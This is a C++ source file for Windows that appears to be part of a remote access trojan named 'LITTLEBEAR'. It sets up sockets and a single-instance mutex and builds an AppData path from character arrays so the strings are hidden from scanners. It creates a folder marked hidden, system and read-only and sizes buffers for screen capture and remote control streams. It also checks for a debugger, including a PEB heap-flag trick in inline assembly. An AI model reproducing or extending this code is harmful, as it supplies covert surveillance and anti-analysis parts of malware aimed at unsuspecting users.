#include <windows.h>
#include "api.h"
#include "filehelper.h"
#include <DbgHelp.h>
#include "function/interface.h"
#include "public.h"

#include "log.h"

#define WSASTARTUP_VERSION 0X0202




int initSocket()
{
	WSADATA stWsa = { 0 };
	int iRet = lpWSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (iRet)
	{
		writeLog("InitWindowsSocket lpWSAStartup error\r\n");
		return FALSE;
	}
	return TRUE;
}




HANDLE  CheckInstanceExist(BOOL* exist)
{
	HANDLE h = lpCreateMutexA(NULL, TRUE, LITTLEBEAR_MUTEX_NAME);
	DWORD dwRet = lpRtlGetLastWin32Error();
	if (h)
	{
		if (ERROR_ALREADY_EXISTS == dwRet)
		{
			*exist = TRUE;
			return h;
		}
		else if (dwRet == FALSE)
		{
			*exist = FALSE;
			return h;
		}
		else
		{
			*exist = FALSE;
			return h;
		}
	}
	else {
		*exist = FALSE;
		return FALSE;
	}
}


int getRunningPath() {
	int iRet = 0;
	if (*strUserName == 0)
	{
		GetUserAndComputerName(strUserName, strComputerName);
	}

	char szPEFilePathWin7Format[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','a','p','p','d','a','t','a','\\','l','o','c','a','l','\\','%','s','\\',0 };
	char szPEFilePathWin7[MAX_PATH];
	lpwsprintfA(szPEFilePathWin7, szPEFilePathWin7Format, strUserName, LITTLEBEARNAME);

	char szPEFilePathFormat[] = { 'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',
		0x5c,'%','s',0x5c,'L','o','c','a','l',' ','S','e','t','t','i','n','g','s',0x5c,'%','s','\\',0 };
	char szPEFilePath[MAX_PATH];
	lpwsprintfA(szPEFilePath, szPEFilePathFormat, strUserName, LITTLEBEARNAME);

	if (*szSysDir == 0)
	{
		GetSystemDir(szSysDir);
	}
	szPEFilePathWin7[0] = szSysDir[0];
	szPEFilePath[0] = szSysDir[0];

	if (iSystemVersion == 0)
	{
		iSystemVersion = GetWindowsVersion(strSysVersion);
	}

	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		lplstrcpyA(strDataPath, szPEFilePathWin7);
	}
	else
	{
		lplstrcpyA(strDataPath, szPEFilePath);
	}
	return 0;
}



int createDataPath()
{
	int iRet = 0;
	iRet = getRunningPath();

	iRet = FileHelper::CheckPathExist(string(strDataPath));
	if (iRet == FALSE) {
		iRet = MakeSureDirectoryPathExists(strDataPath);
		if (iRet == 0)
		{
			return FALSE;
		}
		else
		{
			iRet = lpSetFileAttributesA(strDataPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY);
			return TRUE;
		}
	}
	else
	{
		iRet = lpSetFileAttributesA(strDataPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY);
		return TRUE;
	}

	return FALSE;
}


int initDisplay(int* JPG_STREAM_SIZE, int* BMP_STREAM_SIZE, int* REMOTECONTROL_BUFFER_SIZE) {
	DEVMODE devmode = { 0 };
	devmode.dmSize = sizeof(DEVMODE);
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	if (Isgetdisplay == FALSE)
	{
		return FALSE;
	}

	ScrnResolutionX = devmode.dmPelsWidth;
	ScrnResolutionY = devmode.dmPelsHeight;

	int widthmod = 32 - (devmode.dmPelsWidth * BITSPERPIXEL) % 32;
	int width = 0;
	if (widthmod)
	{
		width = (devmode.dmPelsWidth * BITSPERPIXEL + widthmod) / 8;
	}
	else {
		width = (devmode.dmPelsWidth * BITSPERPIXEL) / 8;
	}
	*BMP_STREAM_SIZE = width * devmode.dmPelsHeight + 0x1000;
	//4:1 8:1 16:1
	*JPG_STREAM_SIZE = *BMP_STREAM_SIZE / 2;


	int remotewidthmod = 32 - (devmode.dmPelsWidth * REMOTEBMP_BITSPERPIXEL) % 32;
	int remotewidth = 0;
	if (remotewidthmod)
	{
		remotewidth = (devmode.dmPelsWidth * REMOTEBMP_BITSPERPIXEL + remotewidthmod) / 8;
	}
	else {
		remotewidth = (devmode.dmPelsWidth * REMOTEBMP_BITSPERPIXEL) / 8;
	}

	*REMOTECONTROL_BUFFER_SIZE = remotewidth * devmode.dmPelsHeight + 0x1000;

	int dpi = 0;
	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		dpi = lpIsProcessDPIAware();
		if (dpi == FALSE && iSystemVersion >= SYSTEM_VERSION_VISTA)
		{
			dpi = lpSetProcessDPIAware();
		}
	}

	return TRUE;
}






int  isDebugged()
{
	return IsDebuggerPresent();

#ifndef _WIN64
	int result = 0;
	__asm
	{
		// 进程的PEB
		mov eax, fs: [30h]
		// 控制堆操作函数的工作方式的标志位
		mov eax, [eax + 68h]
		// 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, 
		// FLG_HEAP_ENABLE_FREE_CHECK and FLG_HEAP_VALIDATE_PARAMETERS，
		// 它们的并集就是x70
		// 下面的代码相当于C/C++的
		// eax = eax & 0x70
		and eax, 0x70
		mov result, eax
	}

	return result != 0;
#else
	return IsDebuggerPresent();
#endif
}